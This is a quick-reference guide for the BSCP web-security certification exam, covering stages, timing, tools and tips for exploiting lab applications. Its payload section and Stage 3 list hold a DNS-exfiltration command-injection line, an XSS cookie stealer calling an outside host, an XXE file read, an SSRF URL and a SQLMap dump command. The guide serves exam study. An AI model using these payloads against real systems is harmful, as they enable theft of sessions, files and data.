# BSCP Exam Quick Reference Guide

## 🎯 Exam Format

- **2 Applications** × **2 Hours Each** = 4 hours total
- **3 Stages per Application:**
  1. Get access to any user
  2. Escalate to administrator
  3. Read `/home/carlos/secret`

## ⚡ Quick Strategy

### Stage 1: Access (First 30-40 min)
1. **Scan search input** with Burp Scanner → XSS
2. **Check password reset** → Host header poisoning
3. **Look for tracking.js + X-Cache** → Web cache poisoning
4. **Test feedback forms** → HTTP request smuggling

### Stage 2: Privilege Escalation (30-40 min)
1. **Find Advanced Search** → SQLMap `--level 5 --risk 3`
2. **Check profile update JSON** → Look for `roleId`, `isAdmin`
3. **Test email change** → CSRF → Reset admin password
4. **Analyze JWT** → Algorithm confusion, header injection

### Stage 3: File System Access (40-50 min)
1. **Feedback form email field** → `||nslookup $(cat /home/carlos/secret).burp.oastify.com||`
2. **Image parameter** → Path traversal (let Burp Scanner find it)
3. **Product details** → SSTI `{{7*7}}`
4. **Stock check XML** → XXE
5. **Admin panel features** → SSRF to `localhost:6566`

## 🔥 Critical Payloads

### Command Injection (DNS Exfiltration)
```bash
||nslookup $(cat /home/carlos/secret).burp.oastify.com||
```

### XSS (Cookie Stealer)
```html
<script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

### Path Traversal (WAF Bypass)
If basic traversal works but `/home/carlos/secret` blocked:
- Use **full path URL encoding** (double-encoded entire payload)

### SSRF (Exam-Specific)
```
http://localhost:6566/home/carlos/secret
```

### XXE
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### SQLMap
```bash
sqlmap -r request.txt --level 5 --risk 3 --batch --dump
```

## 🛠️ Essential Tools

1. **Burp Scanner** - Run on everything
2. **Burp Collaborator** - Always have it ready
3. **SQLMap** - For SQL injection
4. **JWT Editor** - Burp extension for JWT
5. **Param Miner** - For cache poisoning
6. **HTTP Request Smuggler** - For request smuggling
7. **Hackvertor** - For XML encoding

## ⏰ Time Management

| Time | Activity |
|------|----------|
| 0-5 min | Explore app, identify functionality |
| 5-40 min | Stage 1: Get user access |
| 40-80 min | Stage 2: Escalate privileges |
| 80-120 min | Stage 3: Read secret file |

**If stuck >15 min on one stage → Move to other app!**

## 🎓 Exam Tips

1. **Use Burp Scanner aggressively** - It finds 80% of vulnerabilities
2. **DNS exfiltration for command injection** - Most reliable method
3. **SQLMap for SQL injection** - Don't waste time on manual
4. **Check port 6566 for SSRF** - Exam-specific internal service
5. **Full URL encoding for path traversal** - If basic payloads blocked
6. **Always test feedback forms** - Common for command injection
7. **Look for Advanced Search** - Usually SQL injection
8. **JWT algorithm confusion** - RS256 → HS256 is common
9. **Host header on password reset** - Easy win for Stage 1
10. **Keep Burp Collaborator open** - Essential for out-of-band attacks

## 📋 Pre-Exam Checklist

- [ ] Burp Suite configured and licensed
- [ ] Burp Collaborator working
- [ ] SQLMap installed and tested
- [ ] Essential Burp extensions installed:
  - [ ] JWT Editor
  - [ ] Param Miner
  - [ ] HTTP Request Smuggler
  - [ ] Hackvertor
  - [ ] Java Deserialization Scanner
- [ ] Reviewed all cheatsheets
- [ ] Practiced all PortSwigger labs
- [ ] Comfortable with Burp Scanner
- [ ] Know how to use SQLMap

## 🚀 During Exam

1. **Stay calm** - You have 4 hours
2. **Use Scanner** - Let it run while you explore
3. **Document findings** - Keep notes of what you've tried
4. **Switch apps if stuck** - Don't waste time
5. **Read error messages** - They often reveal vulnerabilities
6. **Check Burp Collaborator regularly** - Don't miss callbacks
7. **Time box each stage** - 40 min max per stage

## 🎯 Success Criteria

- **Pass:** Complete both applications (all 6 stages)
- **Each stage:** Must be completed in sequence
- **Final goal:** Read `/home/carlos/secret` on both apps

---

**Good luck! You've got this! 🎓**
